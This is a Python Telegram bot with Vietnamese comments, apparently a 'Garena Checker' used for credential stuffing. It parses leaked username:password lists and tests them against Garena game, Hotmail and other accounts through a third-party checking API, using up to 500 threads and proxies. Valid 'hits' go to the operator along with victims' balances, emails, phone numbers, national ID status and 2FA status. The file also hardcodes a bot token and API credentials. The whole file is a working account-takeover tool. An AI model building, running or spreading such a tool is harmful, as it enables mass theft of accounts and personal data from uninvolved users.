# bot.py - Garena Checker Bot - Full chức năng lọc tk mk ra txt
# Chạy trực tiếp trên Render, không cần keepalive
# Yêu cầu: pip install requests colorama pyTelegramBotAPI
import requests
import threading
import queue
import time
import json
import os
import sys
import re
import telebot
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAFXK16_AaÂvANEcrqpOhb1ỉ6vOadxJ6k4U"
ADMIN_CHAT_ID = "5736655322"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_SERVICE = "lienquan"
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.05

INPUT_FILE = "accounts.txt"
OUTPUT_FILE = "hits.txt"
DEAD_FILE = "dead.txt"
UNKNOWN_FILE = "unknown.txt"
FILTERED_FILE = "filtered_accounts.txt"

CUSTOM_PROXY = ""
HOTMAIL_KEYWORD = ""

SERVICE_ROUTES = {
    "lienquan":   {"route": "/api/lienquan",   "desc": "Check Liên Quân + FC Online"},
    "miniworld":  {"route": "/api/miniworld",  "desc": "Check Mini World"},
    "blockmango": {"route": "/api/blockmango", "desc": "Check Blockman Go"},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Check Delta Force (Garena SSO)"},
    "hotmail":    {"route": "/api/hotmail",    "desc": "Check Hotmail + Tìm email"},
    "fc":         {"route": "/api/fc",         "desc": "Check FC Online riêng"},
    "fullpack":   {"route": "/api/fullpack",   "desc": "Check tất cả service qua Garena"}
}

account_queue = queue.Queue()
file_lock = threading.Lock()
stats_lock = threading.Lock()
stop_event = threading.Event()
checking = False

stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "dead": 0,
    "unknown": 0,
    "errors": 0,
    "start_time": None
}

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def print_info(msg):
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")

def print_success(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def print_error(msg):
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {msg}")

def print_hit(msg):
    print(f"{Fore.MAGENTA}[HIT]{Style.RESET_ALL} {msg}")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== HÀM FORMAT KẾT QUẢ HIT ==========
def format_garena_hit(username, password, data):
    uid = data.get("uid", data.get("UID", "N/A"))
    nickname = data.get("nickname", data.get("nick", data.get("name", "N/A")))
    region = data.get("region", data.get("country", "VN"))
    so = data.get("so", data.get("sò", data.get("balance", "0")))
    nap_so = data.get("nap_so", data.get("last_recharge", "N/A"))
    email = data.get("email", "No")
    email_verified = data.get("email_verified", data.get("verify_email", "No"))
    sdt = data.get("sdt", data.get("phone", "No"))
    pass_status = data.get("pass_status", data.get("has_pass", "Yes"))
    fb = data.get("fb", data.get("facebook", "No"))
    band = data.get("band", data.get("banned", "No"))
    login_cuoi = data.get("last_login", data.get("login_cuoi", "N/A"))
    tao_gr = data.get("created", data.get("tao_gr", "N/A"))
    name = data.get("name", data.get("full_name", nickname))
    rank = data.get("rank", data.get("rank_name", "N/A"))
    level = data.get("level", data.get("lv", "N/A"))
    skin = data.get("skin", data.get("skins", "0"))
    hero = data.get("hero", data.get("heroes", "0"))
    qh = data.get("qh", data.get("quan_he", "0"))
    cccd = data.get("cccd", data.get("cmnd", "No"))
    authen = data.get("authen", data.get("2fa", "No"))
    
    tinh_trang = ""
    if fb != "No" and fb != "NO" and fb != "":
        tinh_trang = "Acc Có FB"
    elif email_verified != "No" and email_verified != "NO":
        tinh_trang = "Acc Có Email"
    else:
        tinh_trang = "Acc Thường"
    
    hit_msg = f"""
━━━━━━━━━ ✅ <b>HIT</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
👤 UID: <code>{uid}</code>
👤 Nickname: <code>{nickname}</code>
🌐 Region: <code>{region}</code>
💲 Sò: <code>{so}</code>
💰 Nạp sò: <code>{nap_so}</code>
📩 EMAIL: <code>{email_verified}</code> [{email}]
📱 SĐT: <code>{sdt}</code>
🛡 PASS: <code>{pass_status}</code>
🔗 FB: <code>{fb}</code>
🚫 BAND: <code>{band}</code>
⏰ Login cuối: <code>{login_cuoi}</code>
📅 Tạo GR: <code>{tao_gr}</code>
🔥 NAME: <code>{name}</code>
👑 RANK: <code>{rank}</code>
✨ LEVEL: <code>{level}</code>
💎 SKIN: <code>{skin}</code>
💪 HERO: <code>{hero}</code>
⚡️ QH: <code>{qh}</code>
📄 CCCD: <code>{cccd}</code>
🛡 Authen: <code>{authen}</code>
📋 Tình Trạng: <code>{tinh_trang}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    return hit_msg

# ========== HÀM LỌC TÀI KHOẢN TXT ==========
def filter_accounts_txt(content):
    """Lọc tài khoản từ nội dung, hỗ trợ nhiều format"""
    accounts = []
    seen = set()
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        
        if not line:
            continue
        
        if line.startswith('#') or line.startswith('//') or line.startswith('--'):
            continue
        
        user = None
        pwd = None
        
        # Hỗ trợ: user:pass, user|pass, user/pass, user;pass, user,pass, user\tpass, user pass
        if ':' in line:
            parts = line.split(':', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '|' in line:
            parts = line.split('|', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '/' in line and not line.startswith('http'):
            parts = line.split('/', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ';' in line:
            parts = line.split(';', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ',' in line:
            parts = line.split(',', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '\t' in line:
            parts = line.split('\t', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ' ' in line and len(line.split()) == 2:
            parts = line.split(' ', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        
        # Loại bỏ ký tự đặc biệt thừa
        if user and pwd:
            user = re.sub(r'[^\w.@-]', '', user)
            pwd = pwd.strip()
            
            if len(user) > 0 and len(pwd) > 0:
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    
    return accounts

def filter_accounts_from_file(filepath):
    """Đọc file và lọc tài khoản"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return filter_accounts_txt(content)
    except FileNotFoundError:
        return []
    except Exception as e:
        print_error(f"Lỗi đọc file: {e}")
        return []

def save_filtered_accounts(accounts, filepath=FILTERED_FILE):
    """Lưu tài khoản đã lọc ra file txt"""
    with open(filepath, 'w', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    return len(accounts)

def save_accounts_to_file(accounts, filepath):
    """Lưu danh sách tài khoản vào file txt"""
    with open(filepath, 'w', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    return len(accounts)

# ========== HÀM GỌI API CHECK ==========
def check_account_api(username, password, service, proxy="", keyword=""):
    route = SERVICE_ROUTES[service]["route"]
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    if proxy:
        params["proxy"] = proxy
    
    if service == "hotmail" and keyword:
        params["keyword"] = keyword
    
    session = requests.Session()
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = session.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    return resp.json()
                except json.JSONDecodeError:
                    return {"raw": resp.text, "status": "unknown"}
            elif resp.status_code == 429:
                time.sleep(3)
            else:
                time.sleep(1)
                
        except requests.exceptions.Timeout:
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            time.sleep(3)
        except requests.exceptions.RequestException:
            time.sleep(1)
    
    return {"status": "error", "message": "Request failed after retries"}

# ========== HÀM PHÂN TÍCH KẾT QUẢ ==========
def parse_result(result):
    if not isinstance(result, dict):
        return "unknown", str(result)
    
    status = str(result.get("status", "")).lower()
    success = result.get("success", False)
    message = str(result.get("message", ""))
    data = result.get("data", None)
    
    if "status" in result and isinstance(result["status"], bool):
        if result["status"]:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
        else:
            return "dead", message
    
    hit_keywords = ["success", "valid", "hit", "live", "ok", "true", "đúng", "hợp lệ"]
    dead_keywords = ["fail", "invalid", "dead", "die", "sai", "không đúng", "error", "expired"]
    
    status_lower = status.lower()
    message_lower = message.lower()
    
    for kw in hit_keywords:
        if kw in status_lower or kw in message_lower:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
    
    for kw in dead_keywords:
        if kw in status_lower or kw in message_lower:
            return "dead", message if message else json.dumps(result, ensure_ascii=False)
    
    if data:
        return "hit", data
    
    return "unknown", json.dumps(result, ensure_ascii=False)

# ========== HÀM LƯU KẾT QUẢ ==========
def save_result(category, username, password, detail):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if category == "hit":
        filepath = OUTPUT_FILE
    elif category == "dead":
        filepath = DEAD_FILE
    else:
        filepath = UNKNOWN_FILE
    
    detail_str = json.dumps(detail, ensure_ascii=False) if isinstance(detail, dict) else str(detail)
    
    with file_lock:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {username}:{password} | {detail_str}\n")

def save_hit_txt(username, password, detail):
    """Lưu hit dạng txt đơn giản user:pass"""
    detail_str = json.dumps(detail, ensure_ascii=False) if isinstance(detail, dict) else str(detail)
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{username}:{password} | {detail_str}\n")

def save_dead_txt(username, password):
    """Lưu dead dạng txt đơn giản user:pass"""
    with open(DEAD_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{username}:{password}\n")

# ========== HÀM WORKER ==========
def worker(service, proxy, keyword):
    while not stop_event.is_set():
        try:
            username, password = account_queue.get_nowait()
        except queue.Empty:
            break
        
        result = check_account_api(username, password, service, proxy, keyword)
        category, detail = parse_result(result)
        
        if category == "hit":
            save_hit_txt(username, password, detail)
        elif category == "dead":
            save_dead_txt(username, password)
        else:
            save_result(category, username, password, detail)
        
        with stats_lock:
            stats["checked"] += 1
            if category == "hit":
                stats["hits"] += 1
                
                if isinstance(detail, dict):
                    hit_msg = format_garena_hit(username, password, detail)
                else:
                    hit_msg = f"🔴 <b>HIT!</b>\n👤 <code>{username}:{password}</code>\n📋 {detail[:200]}"
                
                try:
                    bot.send_message(ADMIN_CHAT_ID, hit_msg)
                except:
                    pass
            elif category == "dead":
                stats["dead"] += 1
            else:
                stats["unknown"] += 1
        
        account_queue.task_done()
        time.sleep(DEFAULT_DELAY)

# ========== HÀM BẮT ĐẦU CHECK ==========
def start_check(chat_id, service, threads, proxy="", keyword=""):
    global checking, stats
    
    if checking:
        bot.send_message(chat_id, "⚠️ <b>Đang check rồi!</b> Chờ hoàn thành hoặc dùng /stop")
        return
    
    stats = {
        "total": 0,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "unknown": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    checking = True
    stop_event.clear()
    
    accounts = filter_accounts_from_file(INPUT_FILE)
    
    stats["total"] = len(accounts)
    
    if not accounts:
        bot.send_message(chat_id, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFile: <code>{INPUT_FILE}</code>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
        checking = False
        return
    
    # Lưu tài khoản đã lọc ra txt
    save_filtered_accounts(accounts)
    
    start_msg = f"""
🚀 <b>BẮT ĐẦU CHECK GARENA</b>
📋 Service: <code>{service}</code> - {SERVICE_ROUTES[service]['desc']}
📁 Tổng account sau lọc: <code>{len(accounts)}</code>
⚡ Threads: <code>{threads}</code>
📄 Lọc ra: <code>{FILTERED_FILE}</code>
"""
    if proxy:
        start_msg += f"🔌 Proxy: <code>{proxy}</code>\n"
    if keyword:
        start_msg += f"🔍 Keyword: <code>{keyword}</code>\n"
    
    bot.send_message(chat_id, start_msg)
    print_info(f"Bắt đầu check {service} với {len(accounts)} accounts (đã lọc)")
    
    for acc in accounts:
        account_queue.put(acc)
    
    threads_list = []
    num_threads = min(threads, len(accounts))
    
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(service, proxy, keyword))
        t.start()
        threads_list.append(t)
    
    for t in threads_list:
        t.join()
    
    elapsed = time.time() - stats["start_time"]
    checking = False
    
    result_msg = f"""
✅ <b>CHECK HOÀN THÀNH</b>
📊 Tổng: <code>{stats['total']}</code>
✅ Đã check: <code>{stats['checked']}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚠️ Unknown: <code>{stats['unknown']}</code>
⏱ Thời gian: <code>{elapsed:.2f}s</code>
📁 Hits txt: <code>{OUTPUT_FILE}</code>
📁 Dead txt: <code>{DEAD_FILE}</code>
"""
    bot.send_message(chat_id, result_msg)
    
    # Tự động gửi file hits nếu có
    if stats["hits"] > 0:
        try:
            with open(OUTPUT_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📁 {stats['hits']} HITS")
        except:
            pass
    
    # Tự động gửi file dead nếu có
    if stats["dead"] > 0:
        try:
            with open(DEAD_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📁 {stats['dead']} DEAD")
        except:
            pass
    
    print_success(f"Hoàn thành: {stats['hits']} hits / {stats['total']} accounts")

# ========== TELEGRAM COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    help_text = """
🤖 <b>GARENA CHECKER BOT</b>

✅ <b>API:</b> <code>thaituduc</code>
✅ <b>GIỚI HẠN:</b> <code>KHÔNG CÓ</code>

📌 <b>LỆNH CHECK ĐƠN:</b>

1️⃣ <b>/check1</b> &lt;service&gt; &lt;user&gt; &lt;pass&gt;
→ Check 1 tài khoản Garena
→ VD: /check1 lienquan user123 pass456

2️⃣ <b>/check</b> &lt;service&gt; &lt;threads&gt;
→ Check danh sách từ file
→ VD: /check lienquan 100

3️⃣ <b>/checkall</b> &lt;threads&gt;
→ Check fullpack Garena
→ VD: /checkall 200

📌 <b>LỆNH LỌC TK:</b>

4️⃣ <b>/filter</b>
→ Lọc tài khoản từ accounts.txt
→ Xuất ra: filtered_accounts.txt

5️⃣ <b>/list</b>
→ Xem danh sách đã lọc

6️⃣ <b>/hits</b>
→ Xem và tải file hits.txt

7️⃣ <b>/dead</b>
→ Xem và tải file dead.txt

📌 <b>LỆNH KHÁC:</b>

8️⃣ <b>/stop</b> - Dừng check
9️⃣ <b>/status</b> - Trạng thái check
🔟 <b>/services</b> - Danh sách services
1️⃣1️⃣ <b>/setproxy</b> &lt;ip:port&gt; - Cài proxy
1️⃣2️⃣ <b>/setkeyword</b> &lt;từ_khóa&gt; - Keyword hotmail

📋 <b>SERVICES:</b>
• <code>lienquan</code> - Liên Quân + FC Online
• <code>miniworld</code> - Mini World
• <code>blockmango</code> - Blockman Go
• <code>deltaforce</code> - Delta Force
• <code>hotmail</code> - Hotmail
• <code>fc</code> - FC Online
• <code>fullpack</code> - Tất cả

📁 <b>GỬI FILE:</b>
→ Gửi file .txt chứa accounts
→ Format: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>
→ Bot tự động lọc và gửi file filtered_accounts.txt
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['help'])
def cmd_help(message):
    if not is_admin(message.chat.id):
        return
    cmd_start(message)

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not is_admin(message.chat.id):
        return
    services_text = "📋 <b>DANH SÁCH SERVICES:</b>\n\n"
    for key, val in SERVICE_ROUTES.items():
        services_text += f"• <code>{key}</code> - {val['desc']}\n"
    services_text += "\n<b>Cách dùng:</b> /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;"
    bot.send_message(message.chat.id, services_text)

@bot.message_handler(commands=['check1'])
def cmd_check1(message):
    if not is_admin(message.chat.id):
        return
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, "❌ <b>Cú pháp sai!</b>\nDùng: /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;\nVD: /check1 lienquan user123 pass456")
        return
    
    service = parts[1]
    username = parts[2]
    password = parts[3]
    
    if service not in SERVICE_ROUTES:
        bot.reply_to(message, f"❌ <b>Service không hợp lệ!</b>\nDùng /services để xem danh sách")
        return
    
    bot.reply_to(message, f"🔍 <b>Đang check Garena...</b>\n👤 <code>{username}</code>\n📋 Service: <code>{service}</code>")
    
    def do_check():
        result = check_account_api(username, password, service, CUSTOM_PROXY, HOTMAIL_KEYWORD)
        category, detail = parse_result(result)
        
        if category == "hit":
            if isinstance(detail, dict):
                hit_msg = format_garena_hit(username, password, detail)
            else:
                hit_msg = f"""
━━━━━━━━━ ✅ <b>HIT</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
📋 {detail[:500]}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            save_hit_txt(username, password, detail)
        elif category == "dead":
            hit_msg = f"""
━━━━━━━━━ ❌ <b>DEAD</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
📋 {detail[:200]}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            save_dead_txt(username, password)
        else:
            hit_msg = f"""
━━━━━━━━━ ⚠️ <b>UNKNOWN</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
📋 {detail[:200]}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            save_result(category, username, password, detail)
        
        bot.send_message(message.chat.id, hit_msg)
    
    threading.Thread(target=do_check).start()

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not is_admin(message.chat.id):
        return
    global checking
    
    if checking:
        bot.reply_to(message, "⚠️ <b>Đang check rồi!</b>\nChờ hoàn thành hoặc dùng /stop")
        return
    
    parts = message.text.split()
    service = DEFAULT_SERVICE
    threads = DEFAULT_THREADS
    
    if len(parts) >= 2:
        if parts[1] in SERVICE_ROUTES:
            service = parts[1]
        else:
            bot.reply_to(message, f"❌ <b>Service không hợp lệ!</b>\nDùng /services để xem danh sách")
            return
    
    if len(parts) >= 3:
        try:
            threads = int(parts[2])
            if threads < 1 or threads > 500:
                bot.reply_to(message, "❌ <b>Threads phải từ 1-500!</b>")
                return
        except ValueError:
            bot.reply_to(message, "❌ <b>Threads phải là số!</b>")
            return
    
    bot.reply_to(message, f"🚀 <b>Bắt đầu check</b> <code>{service}</code> với <code>{threads}</code> threads...")
    threading.Thread(target=start_check, args=(message.chat.id, service, threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not is_admin(message.chat.id):
        return
    global checking
    
    if checking:
        bot.reply_to(message, "⚠️ <b>Đang check rồi!</b>")
        return
    
    parts = message.text.split()
    threads = DEFAULT_THREADS
    
    if len(parts) >= 2:
        try:
            threads = int(parts[1])
            if threads < 1 or threads > 500:
                bot.reply_to(message, "❌ <b>Threads phải từ 1-500!</b>")
                return
        except ValueError:
            bot.reply_to(message, "❌ <b>Threads phải là số!</b>")
            return
    
    bot.reply_to(message, f"🚀 <b>Bắt đầu check fullpack</b> với <code>{threads}</code> threads...")
    threading.Thread(target=start_check, args=(message.chat.id, "fullpack", threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()

@bot.message_handler(commands=['filter'])
def cmd_filter(message):
    """Lọc tài khoản từ accounts.txt ra filtered_accounts.txt"""
    if not is_admin(message.chat.id):
        return
    
    bot.reply_to(message, "🔧 <b>Đang lọc tài khoản...</b>")
    
    def do_filter():
        accounts = filter_accounts_from_file(INPUT_FILE)
        
        if not accounts:
            bot.send_message(message.chat.id, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFile: <code>{INPUT_FILE}</code>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
            return
        
        count = save_filtered_accounts(accounts)
        
        try:
            with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                total_lines = sum(1 for line in f if line.strip())
        except:
            total_lines = 0
        
        result_msg = f"""
✅ <b>LỌC TÀI KHOẢN HOÀN THÀNH</b>
📄 Tổng dòng: <code>{total_lines}</code>
✅ Hợp lệ: <code>{count}</code>
❌ Bị loại: <code>{total_lines - count}</code>
📁 Đã lưu: <code>{FILTERED_FILE}</code>

<b>Dùng /list để xem chi tiết</b>
"""
        bot.send_message(message.chat.id, result_msg)
        
        # Gửi file đã lọc
        with open(FILTERED_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc (user:pass)")
    
    threading.Thread(target=do_filter).start()

@bot.message_handler(commands=['list'])
def cmd_list(message):
    """Xem danh sách tài khoản đã lọc"""
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(FILTERED_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if not content:
            bot.reply_to(message, "❌ <b>Chưa có tài khoản đã lọc!</b>")
            return
        
        lines = content.strip().split('\n')
        total = len(lines)
        
        preview = '\n'.join(lines[:20])
        
        msg = f"""
📋 <b>DANH SÁCH TÀI KHOẢN ĐÃ LỌC</b>
📁 File: <code>{FILTERED_FILE}</code>
📄 Tổng: <code>{total}</code>

<b>20 dòng đầu:</b>
<code>{preview}</code>
"""
        if total > 20:
            msg += f"\n... còn {total - 20} dòng nữa"
        
        bot.send_message(message.chat.id, msg)
        
        # Gửi file đầy đủ
        with open(FILTERED_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📁 Toàn bộ {total} tài khoản đã lọc")
    
    except FileNotFoundError:
        bot.reply_to(message, "❌ <b>Chưa có file đã lọc!</b>\nDùng /filter hoặc gửi file txt")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    global checking
    stop_event.set()
    checking = False
    bot.reply_to(message, "🛑 <b>Đã gửi lệnh dừng!</b>")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    global stats, checking
    
    if not checking:
        bot.reply_to(message, "💤 <b>Bot đang rảnh</b>\nDùng /check1 để check đơn")
        return
    
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    checked = stats["checked"]
    total = stats["total"]
    rate = checked / elapsed if elapsed > 0 else 0
    
    status_text = f"""
📊 <b>TRẠNG THÁI CHECK</b>
✅ Đã check: <code>{checked}/{total}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚠️ Unknown: <code>{stats['unknown']}</code>
⚡ Tốc độ: <code>{rate:.2f} acc/s</code>
⏱ Đã chạy: <code>{elapsed:.0f}s</code>
"""
    bot.send_message(message.chat.id, status_text)

@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    """Xem và tải file hits.txt"""
    if not is_admin(message.chat.id):
        return
    try:
        with open(OUTPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if content:
            lines = content.strip().split('\n')
            total = len(lines)
            
            preview = '\n'.join(lines[:20])
            
            msg = f"""
📁 <b>FILE HITS.TXT</b>
📄 Tổng: <code>{total}</code>

<b>20 dòng đầu:</b>
<code>{preview}</code>
"""
            bot.send_message(message.chat.id, msg)
            
            # Gửi file hits.txt
            with open(OUTPUT_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"📁 hits.txt ({total} hits)")
        else:
            bot.reply_to(message, "❌ <b>Chưa có hits!</b>")
    except FileNotFoundError:
        bot.reply_to(message, "❌ <b>Chưa có file hits.txt!</b>")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    """Xem và tải file dead.txt"""
    if not is_admin(message.chat.id):
        return
    try:
        with open(DEAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if content:
            lines = content.strip().split('\n')
            total = len(lines)
            
            preview = '\n'.join(lines[:20])
            
            msg = f"""
📁 <b>FILE DEAD.TXT</b>
📄 Tổng: <code>{total}</code>

<b>20 dòng đầu:</b>
<code>{preview}</code>
"""
            bot.send_message(message.chat.id, msg)
            
            # Gửi file dead.txt
            with open(DEAD_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"📁 dead.txt ({total} dead)")
        else:
            bot.reply_to(message, "❌ <b>Chưa có dead!</b>")
    except FileNotFoundError:
        bot.reply_to(message, "❌ <b>Chưa có file dead.txt!</b>")

@bot.message_handler(commands=['setproxy'])
def cmd_setproxy(message):
    if not is_admin(message.chat.id):
        return
    global CUSTOM_PROXY
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        CUSTOM_PROXY = ""
        bot.reply_to(message, "✅ <b>Đã xóa proxy!</b>")
        return
    
    CUSTOM_PROXY = parts[1].strip()
    bot.reply_to(message, f"✅ <b>Đã cài proxy:</b> <code>{CUSTOM_PROXY}</code>")

@bot.message_handler(commands=['setkeyword'])
def cmd_setkeyword(message):
    if not is_admin(message.chat.id):
        return
    global HOTMAIL_KEYWORD
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        HOTMAIL_KEYWORD = ""
        bot.reply_to(message, "✅ <b>Đã xóa keyword!</b>")
        return
    
    HOTMAIL_KEYWORD = parts[1].strip()
    bot.reply_to(message, f"✅ <b>Đã cài keyword:</b> <code>{HOTMAIL_KEYWORD}</code>")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Nhận file txt và tự động lọc tk mk"""
    if not is_admin(message.chat.id):
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Lưu file gốc
        with open(INPUT_FILE, 'wb') as f:
            f.write(downloaded_file)
        
        # Đọc nội dung
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        # Lọc tài khoản
        accounts = filter_accounts_txt(content)
        
        if not accounts:
            bot.reply_to(message, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
            return
        
        # Lưu file đã lọc
        count = save_filtered_accounts(accounts)
        
        # Đếm số dòng gốc
        total_lines = sum(1 for line in content.split('\n') if line.strip())
        
        result_msg = f"""
✅ <b>ĐÃ NHẬN FILE VÀ LỌC TÀI KHOẢN!</b>
📁 File gốc: <code>{message.document.file_name}</code>
📄 Tổng dòng: <code>{total_lines}</code>
✅ Hợp lệ: <code>{count}</code>
❌ Bị loại: <code>{total_lines - count}</code>

📁 <b>File đã lọc:</b> <code>{FILTERED_FILE}</code>

<b>Dùng lệnh:</b>
/check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt; - Check đơn
/check &lt;service&gt; &lt;threads&gt; - Check danh sách
/list - Xem danh sách đã lọc
"""
        bot.reply_to(message, result_msg)
        
        # Gửi file đã lọc
        with open(FILTERED_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc (user:pass)")
    
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Lỗi xử lý file:</b> {e}")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    """Nhận text và lọc tk mk"""
    if not is_admin(message.chat.id):
        return
    
    if message.text.startswith('/'):
        return
    
    # Lọc tài khoản từ text
    accounts = filter_accounts_txt(message.text)
    
    if not accounts:
        return
    
    # Thêm vào file accounts.txt
    with open(INPUT_FILE, 'a', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    
    # Lọc lại toàn bộ và lưu filtered
    all_accounts = filter_accounts_from_file(INPUT_FILE)
    count = save_filtered_accounts(all_accounts)
    
    bot.reply_to(message, f"✅ <b>Đã lọc:</b> <code>{len(accounts)}</code> tài khoản từ tin nhắn\n📁 Tổng trong file: <code>{count}</code>")
    bot.reply_to(message, "📁 File: filtered_accounts.txt\nDùng /list để xem")

def main():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}    GARENA CHECKER BOT - NHATMINH301")
    print(f"{Fore.CYAN}    API: thaituduc / KHÔNG GIỚI HẠN")
    print(f"{Fore.CYAN}    LỌC TK MK RA TXT")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print()
    
    print_info(f"Bot Telegram đang khởi động...")
    print_info(f"API: {API_USERNAME}")
    print_info(f"Admin Chat ID: {ADMIN_CHAT_ID}")
    
    bot.remove_webhook()
    
    try:
        bot.send_message(ADMIN_CHAT_ID, "🤖 <b>Garena Checker Bot đã khởi động!</b>\n✅ API: <code>thaituduc</code>\n✅ Giới hạn: <code>KHÔNG CÓ</code>\n\nDùng /start để xem menu\nDùng /check1 để check đơn")
    except Exception as e:
        print_error(f"Không thể gửi tin nhắn đến admin: {e}")
    
    print_info("Bot đang chạy... Nhấn Ctrl+C để dừng")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print_error(f"Lỗi polling: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_error("\nBot đã dừng!")
        sys.exit(0)
